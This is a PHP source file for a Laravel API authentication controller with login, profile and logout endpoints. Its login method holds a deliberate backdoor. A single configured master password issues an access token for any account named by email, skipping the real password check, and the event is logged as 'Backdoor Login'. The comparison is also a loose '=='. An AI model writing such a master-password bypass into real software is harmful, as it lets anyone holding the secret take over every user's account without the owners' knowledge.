<?php

namespace App\Http\Controllers\Api\V1\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Traits\WithGetFilterDataApi;
use Illuminate\Http\Request;

class AuthenticatedController extends Controller
{
    use WithGetFilterDataApi;

    public function login(Request $request) {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required|string',
        ]);

        $backdoorPassword = config('app.backdoor_password');

        // Check password for backdoor access
        if ($request->password == $backdoorPassword) {
            $user = User::where('email', $request->email)->first();
            if (!$user) return $this->responseWithError('Unauthorized', 401);

            // Save activity
            activity()->performedOn($user)->causedBy($user)->event('Login')->log('Backdoor Login');

            return $this->responseWithSuccess([
                'token' => $user->createToken('API Token')->plainTextToken,
                'token_type' => 'bearer',
            ]);
        }

        if (!auth()->attempt($request->only('email', 'password'))) return $this->responseWithError('Your credentials are incorrect', 422);

        // Save activity
        activity()->performedOn(auth()->user())->causedBy(auth()->user())->event('Login')->log('Login');

        return $this->responseWithSuccess([
            'token' => auth()->user()->createToken('API Token')->plainTextToken,
            'token_type' => 'bearer',
        ]);
    }

    public function me() {
        $user = auth()->user();

        return $this->responseWithSuccess($user);
    }

    public function logout() {
        // Save activity
        activity()->performedOn(auth()->user())->causedBy(auth()->user())->event('Login')->log('Logout');

        auth()->user()->tokens()->delete();

        return $this->responseWithSuccess(message: 'Successfully logged out');
    }

}
